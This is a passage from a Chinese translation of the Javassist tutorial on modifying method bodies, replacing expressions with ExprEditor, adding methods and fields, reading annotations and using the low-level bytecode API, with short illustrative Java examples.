<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// the original method body</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">    System.out.println(e);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意，插入的代码片段必须以 throw 或 return 语句结束。</p>
<h3 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h3><p>CtMethod 和 CtConstructor 提供 setBody() 来替换整个方法体。<strong>它将新的源代码编译成 Java  字节码，并用它替换原方法体。</strong> 如果给定的源文本为 null，则替换后的方法体仅包含return语句，除非结果类型为 void，否则返回零或空值。</p>
<p>在传递给 setBody() 的源代码中，以 $ 开头的标识符具有特殊含义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td>
<td><code>this</code> and 方法的参数</td>
</tr>
<tr>
<td><code>$args</code></td>
<td>方法参数数组.它的类型为 <code>Object[]</code></td>
</tr>
<tr>
<td><code>$$</code></td>
<td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td>
</tr>
<tr>
<td><code>$cflow(</code>…<code>)</code></td>
<td><code>cflow</code> 变量</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装器类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>类型为 java.lang.Class 的参数类型数组</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示返回值类型</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
</tbody></table>
<p><code>$_</code>不可用。</p>
<h3 id="替换表达式"><a href="#替换表达式" class="headerlink" title="替换表达式"></a>替换表达式</h3><p>Javassist 只允许修改方法体中包含的表达式。</p>
<p>javassist.expr.ExprEditor 是一个用于替换方法体中的表达式的类。用户可以定义 ExprEditor 的子类来指定修改表达式的方式。</p>
<p>要运行 ExprEditor 对象，用户必须在 CtMethod 或 CtClass 中调用 instrument()。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtMethod cm = ... ;</span><br><span class="line">cm.instrument(</span><br><span class="line">    <span class="keyword">new</span> ExprEditor() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">edit</span><span class="params">(MethodCall m)</span> <span class="keyword">throws</span> CannotCompileException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (m.getClassName().equals(<span class="string">"Point"</span>)</span><br><span class="line">                          &amp;&amp; m.getMethodName().equals(<span class="string">"move"</span>))</span><br><span class="line">                m.replace(<span class="string">"&#123; $1 = 0; $_ = $proceed($$); &#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>上述代码，搜索由 cm 表示的方法体，并用使用下面的代码替换 Point 中的 move()调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123; $<span class="number">1</span> = <span class="number">0</span>; $_ = $proceed($$); &#125;</span><br></pre></td></tr></table></figure>

<p>因此 move() 的第一个参数总是0。注意，替换的代码不是一个表达式，而是一个语句或块。 它不能是或包含 try-catch 语句。</p>
<p><strong>方法 instrument()搜索一个方法体。</strong>如果它找到了一个表达式，如方法调用、字段访问和对象创建，那么它就在<strong>给定的ExprEditor对象上调用edit()</strong>。<strong>edit()的参数是一个代表找到的表达式的对象</strong>。edit()方法可以通过该对象检查和替换该表达式。</p>
<p><strong>在edit()的参数上调用replace()，可以将给定的语句或块替换为表达式</strong>。如果给定的块是空块，也就是说，<strong>如果执行了replace(“{}”)，那么表达式就会从方法体中删除</strong>。如果你想在表达式之前/之后插入一条语句（或一个代码块），应该向 replace()传递一个类似下面的代码块，无论表达式是方法调用、字段访问、对象创建，还是其他：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123; *before-statements;*  </span><br><span class="line">$_ = $proceed($$);  </span><br><span class="line">*after-statements;* &#125;</span><br></pre></td></tr></table></figure>

<p>当是write access写访问：</p>
<p><code>$_ = $proceed();</code></p>
<p>当是read access读访问：</p>
<p><code>$proceed($$);</code></p>
<h4 id="javassist-expr-MethodCall"><a href="#javassist-expr-MethodCall" class="headerlink" title="javassist.expr.MethodCall"></a>javassist.expr.MethodCall</h4><p>一个MethodCall对象代表一个方法调用。MethodCall中的方法replace()为方法调用替换了一条语句或一个代码块。它接收代表被替换的语句或代码块的源文本，其中以$开头的标识符具有特殊意义，就像传递给insertBefore()的源文本一样。</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>方法调用的目标对象。它不等于 this，它代表了调用者。 如果方法是静态的，则 $0 为 null</td>
</tr>
<tr>
<td><code>$1</code>, <code>$2</code> ..</td>
<td>方法的参数</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>方法调用的结果</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>类型为 java.lang.Class 的参数类型数组</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示返回值类型</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>调用表达式中方法的名称</td>
</tr>
</tbody></table>
<p>这里的方法调用意味着由 MethodCall 对象表示的方法。</p>
<p>其他标识符如 <code>$w</code>，<code>$args</code> 和 <code>$$</code> 也可用。</p>
<p>除非方法调用的返回类型为 void，否则返回值必须在源代码中赋给 <code>$_</code> ，<code>$_</code>的类型是表达式的结果类型。如果结果类型为 void，那么 <code>$_</code> 的值将被忽略。</p>
<p>$proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。</p>
<h4 id="javassist-expr-ConstructorCall"><a href="#javassist-expr-ConstructorCall" class="headerlink" title="javassist.expr.ConstructorCall"></a>javassist.expr.ConstructorCall</h4><p>ConstructorCall 表示构造函数调用，例如包含在构造函数中的 this() 和 super()。<strong>ConstructorCall 中的方法 replace() 可以使用语句或代码块来代替构造函数。</strong>它接收表示替换语句或块的源代码。和 insertBefore() 方法一样，<strong>传递给 replace 的源代码中，</strong>以 $ 开头的标识符具有特殊的含义。</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>构造调用的目标对象。它等于 this</td>
</tr>
<tr>
<td><code>$1</code>, <code>$2</code>, …</td>
<td>构造函数的参数</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>类型为 java.lang.Class 的参数类型数组</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>调用表达式中构造函数的名称</td>
</tr>
</tbody></table>
<p>其他标识符如 <code>$w</code>，<code>$args</code> 和 <code>$$</code> 也可用。</p>
<p>由于任何构造函数必须调用超类的构造函数或同一类的另一个构造函数，所以替换语句必须包含构造函数调用，通常是对 $proceed() 的调用。</p>
<p>$proceed 不是字符串值，而是特殊的语法。 它后面必须跟一个由括号括起来的参数列表。</p>
<h4 id="javassist-expr-FieldAccess"><a href="#javassist-expr-FieldAccess" class="headerlink" title="javassist.expr.FieldAccess"></a>javassist.expr.FieldAccess</h4><p>FieldAccess 对象表示字段访问。 如果找到对应的字段访问操作，ExprEditor 中的 edit() 方法将接收到一个 FieldAccess 对象。FieldAccess 中的 replace() 方法接收替源代码来替换字段访问。</p>
<h4 id="javassist-expr-NewExpr"><a href="#javassist-expr-NewExpr" class="headerlink" title="javassist.expr.NewExpr"></a>javassist.expr.NewExpr</h4><p>NewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。</p>
<h4 id="javassist-expr-NewArray"><a href="#javassist-expr-NewArray" class="headerlink" title="javassist.expr.NewArray"></a>javassist.expr.NewArray</h4><p>NewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。</p>
<h4 id="javassist-expr-Instanceof"><a href="#javassist-expr-Instanceof" class="headerlink" title="javassist.expr.Instanceof"></a>javassist.expr.Instanceof</h4><p>一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。</p>
<h4 id="javassist-expr-Cast"><a href="#javassist-expr-Cast" class="headerlink" title="javassist.expr.Cast"></a>javassist.expr.Cast</h4><p>Cast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。</p>
<h4 id="javassist-expr-Handler"><a href="#javassist-expr-Handler" class="headerlink" title="javassist.expr.Handler"></a>javassist.expr.Handler</h4><p>Handler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。</p>
<h3 id="添加新方法和字段"><a href="#添加新方法和字段" class="headerlink" title="添加新方法和字段"></a>添加新方法和字段</h3><h4 id="添加新方法"><a href="#添加新方法" class="headerlink" title="添加新方法"></a>添加新方法</h4><p>Javassist 可以创建新的方法和构造函数。CtNewMethod 和 CtNewConstructor 提供了几个工厂方法来创建 CtMethod 或 CtConstructor 对象。make() 方法可以通过源代码来CtMethod 或 CtConstructor 对象。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public int xmove(int dx) &#123; x += dx; &#125;"</span>,point);</span><br><span class="line">point.addMethod(m);</span><br></pre></td></tr></table></figure>

<p>上面的代码向类 Point 添加了一个公共方法 xmove()。在这个例子中，x 是类 Point 的一个int 字段。</p>
<p>传递给 make() 和 setBody() 的源文本可以包括以<code>$</code>开头的标识符（除了<code>$_</code>）。 如果目标对象和目标方法名也被传递给 make() 方法，源文本中也可以包括 <code>$proceed</code>。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public int ymove(int dy) &#123; $proceed(0, dy); &#125;"</span>,</span><br><span class="line">                 point, <span class="string">"this"</span>, <span class="string">"move"</span>);</span><br><span class="line">point.addMethod(m);</span><br></pre></td></tr></table></figure>

<p>这个程序创建一个 ymove() 方法，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ymove</span><span class="params">(<span class="keyword">int</span> dy)</span> </span>&#123; <span class="keyword">this</span>.move(<span class="number">0</span>, dy); &#125;</span><br></pre></td></tr></table></figure>

<p>注意，$proceed 已经被替换为 this.move。</p>
<p>Javassist 还提供了另一种添加新方法的方式。 你可以先创建一个抽象方法，然后给它一个方法体：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = ... ;</span><br><span class="line">CtMethod m = <span class="keyword">new</span> CtMethod(CtClass.intType, <span class="string">"move"</span>,<span class="keyword">new</span> CtClass[] &#123; CtClass.intType &#125;, cc);</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">m.setBody(<span class="string">"&#123; x += $1; &#125;"</span>);</span><br><span class="line">cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT);</span><br></pre></td></tr></table></figure>

<p>因为 Javassist 在类中添加了的方法是抽象的，所以在调用 setBody() 之后，必须将类显式地改回非抽象类（拥有方法体）。</p>
<h4 id="相互递归的方法"><a href="#相互递归的方法" class="headerlink" title="相互递归的方法"></a>相互递归的方法</h4><p>如果一个方法调用了另一个没有被添加到类中的方法，Javassist就不能编译该方法。</p>
<p>(<strong>但是Javassist 可以编译一个以递归方式调用自己的方法。</strong>)</p>
<p>要将相互递归的方法添加到一个类中，你需要一个如下所示的技巧。假设你想把方法m()和n()添加到一个由cc表示的类中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = ... ;</span><br><span class="line">CtMethod m = CtNewMethod.make(<span class="string">"public abstract int m(int i);"</span>, cc);</span><br><span class="line">CtMethod n = CtNewMethod.make(<span class="string">"public abstract int n(int i);"</span>, cc);</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">cc.addMethod(n);</span><br><span class="line">m.setBody(<span class="string">"&#123; return ($1 &lt;= 0) ? 1 : (n($1 - 1) * $1); &#125;"</span>);</span><br><span class="line">n.setBody(<span class="string">"&#123; return m($1); &#125;"</span>);</span><br><span class="line">cc.setModifiers(cc.getModifiers() &amp; ~Modifier.ABSTRACT);</span><br></pre></td></tr></table></figure>

<p>你必须先创建两个抽象方法，并将它们添加到类中。然后设置它们的方法体，即使方法体包括互相递归的调用。 最后，必须将类更改为非抽象类。</p>
<h4 id="添加一个字段"><a href="#添加一个字段" class="headerlink" title="添加一个字段"></a>添加一个字段</h4><p>Javassist 还允许用户创建一个新字段。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"z"</span>, point);<span class="comment">//int z;</span></span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure>

<p>该程序向类 Point 添加一个名为 z 的字段。 <code>int z;</code><br>如果必须指定添加字段的初始值，那么上面的程序必须修改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"z"</span>, point);</span><br><span class="line">point.addField(f, <span class="string">"0"</span>);  <span class="comment">// initial value is 0</span></span><br></pre></td></tr></table></figure>

<p><strong>总结：先声明再初始化。</strong></p>
<p>现在，方法 addField() 接收两个参数，第二个参数表示计算初始值的表达式。<strong>这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。</strong></p>
<p>此外，上述代码可以重写为更简单代码：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">CtClass point = ClassPool.getDefault().<span class="keyword">get</span>(<span class="string">"Point"</span>);</span><br><span class="line">CtField f = CtField.make(<span class="string">"public int z = 0;"</span>, point);</span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure>



<h4 id="删除成员"><a href="#删除成员" class="headerlink" title="删除成员"></a>删除成员</h4><p>要删除字段或方法，请在 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。</p>
<h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>CtClass，CtMethod，CtField 和 CtConstructor 提供 getAnnotations() 方法，用于读取注解。 它返回一个注解类型的对象。</p>
<p>例如，假设有以下注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Author &#123;</span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">year</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是使用注解的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Author</span>(name=<span class="string">"Chiba"</span>, year=<span class="number">2005</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，可以使用 getAnnotations() 获取注解的值。 它返回一个包含注解类型对象的数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = ClassPool.getDefault().get(<span class="string">"Point"</span>);</span><br><span class="line">Object[] all = cc.getAnnotations();</span><br><span class="line">Author a = (Author)all[<span class="number">0</span>];</span><br><span class="line">String name = a.name();</span><br><span class="line"><span class="keyword">int</span> year = a.year();</span><br><span class="line">System.out.println(<span class="string">"name: "</span> + name + <span class="string">", year: "</span> + year);</span><br></pre></td></tr></table></figure>

<p>这段代码输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">name: Chiba, year: <span class="number">2005</span></span><br></pre></td></tr></table></figure>

<p>由于 Point 的注解只有 @Author，所以数组的长度是 1，all[0] 是一个 Author 对象。 注解成员值可以通过调用Author对象的 name() 和 year() 来获取。</p>
<p>要使用 getAnnotations()，注释类型（如 Author）必须包含在当前类路径中。它们也必须也可以从 ClassPool 对象访问。如果未找到注释类型的类文件，Javassist 将无法获取该注释类型的成员的默认值。</p>
<h3 id="运行时支持类"><a href="#运行时支持类" class="headerlink" title="运行时支持类"></a>运行时支持类</h3><p>在大多数情况下，使用 Javassist 修改类不需要运行 Javassist。 但是，Javassist 编译器生成的某些字节码需要运行时支持类，这些类位于 javassist.runtime 包中（有关详细信息，请阅读该包的API文档）。请注意，<strong>javassist.runtime 是修改的类时唯一可能需要使用的包</strong>。 修改类的运行时不会再使用其他的 Javassist 类。</p>
<h3 id="导入包"><a href="#导入包" class="headerlink" title="导入包"></a>导入包</h3><p>源代码中的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。</p>
<p><strong>要告诉编译器在解析类名时搜索其他包，请在 ClassPool中 调用 importPackage()</strong>。 例如，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.importPackage(<span class="string">"java.awt"</span>);</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"Test"</span>);</span><br><span class="line">CtField f = CtField.make(<span class="string">"public Point p;"</span>, cc);<span class="comment">//识别为java.awt.Point</span></span><br><span class="line">cc.addField(f);</span><br></pre></td></tr></table></figure>

<p>第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 <strong>编译器可以将 Point 识别为java.awt.Point</strong>。</p>
<p> <strong>importPackage() 不会影响 ClassPool 中的 get() 方法</strong>。只有编译器才考虑导入包。 get() 的参数必须是完整类名。</p>
<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>在目前实现中，Javassist 中包含的 Java 编译器有一些限制：</p>
<ul>
<li><p>J2SE 5.0 引入的新语法（包括枚举和泛型）不受支持。注释由 Javassist 的低级 API 支持。 参见 javassist.bytecode.annotation 包（以及 CtClass 和 CtBehavior 中的 getAnnotations()）。对泛型只提供部分支持。更多信息，请参阅<a href="http://www.javassist.org/tutorial/tutorial3.html#generics" target="_blank" rel="noopener">后面</a>的部分；</p>
</li>
<li><p>初始化数组时，只有一维数组可以用大括号加逗号分隔元素的形式初始化，多维数组还不支持；</p>
</li>
<li><p>编译器不能编译包含内部类和匿名类的源代码。 但是，Javassist 可以读取和修改内部/匿名类的类文件；</p>
</li>
<li><p>不支持带标记的 continue 和 break 语句；</p>
</li>
<li><p>编译器没有正确实现 Java 方法调度算法。编译器可能会混淆在类中定义的重载方法（方法名称相同，查参数列表不同）。例如：</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(A a)</span> </span>&#123; .. &#125; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(B b)</span> </span>&#123; .. &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果编译的表达式是 <code>x.foo(new C())</code>，其中 <code>x</code> 是 <code>X</code> 的实例，编译器将产生对 <code>foo(A)</code> 的调用，尽管编译器可以正确地编译 <code>foo((B) new C())</code> 。</p>
<p><strong>建议使用 # 作为类名和静态方法或字段名之间的分隔符</strong>。 例如，在常规 Java 中：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">javassist</span><span class="selector-class">.CtClass</span><span class="selector-class">.intType</span><span class="selector-class">.getName</span>()</span><br></pre></td></tr></table></figure>

<p>在 javassist.CtClass 中的静态字段 intType 指示的对象上调用一个方法 getName()。 在Javassist 中，用户也可以写上面的表达式，但是建议写成这样：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">javassist.CtClass#intType.getName()</span><br></pre></td></tr></table></figure>

<p>可以使编译器可以快速解析表达式。</p>
<h2 id="字节码级API"><a href="#字节码级API" class="headerlink" title="字节码级API"></a>字节码级API</h2><p>Javassist 还提供了用于直接编辑类文件的低级级 API。 使用此 API之前，你需要详细了解Java 字节码和类文件格式，因为它允许你对类文件进行任意修改。</p>
<p>如果你只想生成一个简单的类文件，使用<code>javassist.bytecode.ClassFileWriter</code>就足够了。 它比<code>javassist.bytecode.ClassFile</code>更快而且更小。</p>
<h3 id="获取ClassFile对象"><a href="#获取ClassFile对象" class="headerlink" title="获取ClassFile对象"></a>获取ClassFile对象</h3><p>javassist.bytecode.ClassFile 对象表示类文件。要获得这个对象，<strong>应该调用 CtClass 中的 <code>getClassFile()</code> 方法</strong>。你<strong>也可以直接从类文件构造 javassist.bytecode.ClassFile 对象</strong>。 例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BufferedInputStream fin</span><br><span class="line">    = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"Point.class"</span>));</span><br><span class="line">ClassFile cf = <span class="keyword">new</span> ClassFile(<span class="keyword">new</span> DataInputStream(fin));</span><br></pre></td></tr></table></figure>

<p>这代码段从 Point.class 创建一个 ClassFile 对象。</p>
<p>ClassFile 对象可以写回类文件。</p>
<p>ClassFile 的 write() 将类文件的内容写入给定的 DataOutputStream。</p>
<p>也可以从头开始创建一个类文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassFile cf = <span class="keyword">new</span> ClassFile(<span class="keyword">false</span>, <span class="string">"test.Foo"</span>, <span class="keyword">null</span>);</span><br><span class="line">cf.setInterfaces(<span class="keyword">new</span> String[] &#123; <span class="string">"java.lang.Cloneable"</span> &#125;);  </span><br><span class="line">FieldInfo f = <span class="keyword">new</span> FieldInfo(cf.getConstPool(), <span class="string">"width"</span>, <span class="string">"I"</span>); f.setAccessFlags(AccessFlag.PUBLIC); </span><br><span class="line">cf.addField(f); </span><br><span class="line">cf.write(<span class="keyword">new</span> DataOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"Foo.class"</span>)));</span><br></pre></td></tr></table></figure>

<p>这段代码生成了一个类文件Foo.class，实现结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> width; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="添加和删除成员"><a href="#添加和删除成员" class="headerlink" title="添加和删除成员"></a>添加和删除成员</h3><p><strong>ClassFile 提供了 addField()，addMethod() 和 addAttribute()</strong>，来向类添加字段、方法和类文件属性。</p>
<p>注意，FieldInfo，MethodInfo 和 AttributeInfo 对象包含了一个指向 ConstPool（常量池表）对象的链接。 ConstPool 对象必须是 ClassFile 对象和添加到该 ClassFile 对象的 FieldInfo（或MethodInfo 等）对象的共同对象。 换句话说，一个FieldInfo（或MethodInfo等）对象不能在不同的ClassFile 对象之间共享。</p>
<p>要从 ClassFile 对象中删除字段或方法，必须首先获取包含该类的所有字段的 java.util.List 对象。 getFields() 和 getMethods() 会返回这些列表。可以通过调用List对象的 remove() 来删除字段或方法。可以以类似的方式删除属性。在 FieldInfo 或 MethodInfo 中调用 getAttributes() 以获取属性列表，并从列表中删除一个属性。</p>
<h3 id="遍历方法体"><a href="#遍历方法体" class="headerlink" title="遍历方法体"></a>遍历方法体</h3><p>使用 CodeIterator 可以检查方法体中的每个字节码指令，要获得 CodeIterator 对象，参考以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassFile cf = ... ; </span><br><span class="line">MethodInfo minfo = cf.getMethod(<span class="string">"move"</span>);    <span class="comment">// we assume move is not overloaded. </span></span><br><span class="line">CodeAttribute ca = minfo.getCodeAttribute(); </span><br><span class="line">CodeIterator i = ca.iterator();</span><br></pre></td></tr></table></figure>

<p>CodeIterator 对象允许你逐个访问每个字节码指令。下面展示了一部分 CodeIterator 中声明的方法：</p>
<ul>
<li><code>void begin()</code> 移动到第一条指令</li>
<li><code>void move(int index)</code> 移动到指定位置的指令</li>
<li><code>boolean hasNext()</code> 是否有下一条指令</li>
<li><code>int next()</code> 返回下一条指令的索引。注意，它<strong>不返回下一条指令的操作码</strong>。</li>
<li><code>int byteAt（int index）</code> 返回索引处的无符号8位整数。</li>
<li><code>int u16bitAt（int index）</code> 返回索引处的无符号16位整数。</li>
<li><code>int write（byte [] code，int index）</code> 在索引处写入字节数组。</li>
<li><code>void insert（int index，byte [] code）</code> 在索引处插入字节数组。自动调整分支偏移量。</li>
</ul>
<p>以下代码段打印了方法体中所有的指令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CodeIterator ci = ... ;</span><br><span class="line"><span class="keyword">while</span> (ci.hasNext()) &#123;</span><br><span class="line">    <span class="keyword">int</span> index = ci.next();</span><br><span class="line">    <span class="keyword">int</span> op = ci.byteAt(index);</span><br><span class="line">    System.out.println(Mnemonic.OPCODE[op]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="生成字节码序列"><a href="#生成字节码序列" class="headerlink" title="生成字节码序列"></a>生成字节码序列</h3><p><code>Bytecode</code> 对象表示字节码指令序列。它是一个可扩展，可增长的字节码数组。<br>以下是示例代码段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ConstPool cp = ...;    <span class="comment">// constant pool table</span></span><br><span class="line">Bytecode b = <span class="keyword">new</span> Bytecode(cp, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">b.addIconst(<span class="number">3</span>);</span><br><span class="line">b.addReturn(CtClass.intType);</span><br><span class="line">CodeAttribute ca = b.toCodeAttribute();</span><br></pre></td></tr></table></figure>

<p>这段代码产生以下序列的代码属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iconst_3</span><br><span class="line">ireturn</span><br></pre></td></tr></table></figure>

<p>还可以通过调用 Bytecode 中的 get() 方法来获取包含此序列的字节数组。获得的数组可以插入另一个代码属性中。</p>
<p>Bytecode 提供了许多方法来添加特定的指令，例如使用 addOpcode() 添加一个 8 位操作码，使用 addIndex() 用于添加一个索引。每个操作码的值定义在 Opcode 接口中。</p>
<p>addOpcode() 和添加特定指令的方法，会自动维持最大堆栈深度，除非控制流没有分支。最大堆栈深度这个值可以通过调用 Bytecode 的 getMaxStack() 方法来获得。它也反映在从 Bytecode对象构造的 CodeAttribute 对象上。要重新计算方法体的最大堆栈深度，可以调用 CodeAttribute 的 computeMaxStack() 方法。</p>
<p>可以使用Bytecode来构造一个方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassFile cf = ...</span><br><span class="line">Bytecode code = <span class="keyword">new</span> Bytecode(cf.getConstPool());</span><br><span class="line">code.addAload(<span class="number">0</span>);</span><br><span class="line">code.addInvokespecial(<span class="string">"java/lang/Object"</span>, MethodInfo.nameInit, <span class="string">"()V"</span>);</span><br><span class="line">code.addReturn(<span class="keyword">null</span>);</span><br><span class="line">code.setMaxLocals(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">MethodInfo minfo = <span class="keyword">new</span> MethodInfo(cf.getConstPool(), MethodInfo.nameInit, <span class="string">"()V"</span>);</span><br><span class="line">minfo.setCodeAttribute(code.toCodeAttribute());</span><br><span class="line">cf.addMethod(minfo);</span><br></pre></td></tr></table></figure>

<p>这段代码制作了默认的构造函数，并将其添加到cf指定的类中，Bytecode对象首先被转换为CodeAttribute对象，然后添加到minfo指定的方法中。最后将该方法添加到类文件cf中。</p>
